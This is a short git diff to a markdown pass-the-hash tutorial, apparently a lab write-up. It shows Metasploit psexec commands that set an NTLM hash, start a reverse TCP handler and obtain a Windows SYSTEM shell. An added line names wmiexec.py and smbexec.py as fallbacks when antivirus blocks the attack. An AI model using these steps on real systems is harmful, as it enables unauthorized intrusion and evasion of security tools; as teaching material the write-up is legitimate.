@@ -132,7 +132,9 @@ Now we need our hash, Note that the **NT** part of this hash is the most importa
 
 ```shell
 msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+
 smbpass => aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+
 msf6 exploit(windows/smb/psexec) > exploit
 
 [*] Started reverse TCP handler on 192.168.0.157:4444 
@@ -213,3 +215,5 @@ Microsoft Windows [Version 10.0.19045.2006]
 C:\Windows\system32>
 
 ```
+
+In case we get blocked by antivirus we have other tools like `wmiexec.py` and `smbexec.py` ,  this tools also have the same syntax with `psexec.py` so we can just run them directly if one doesn't work
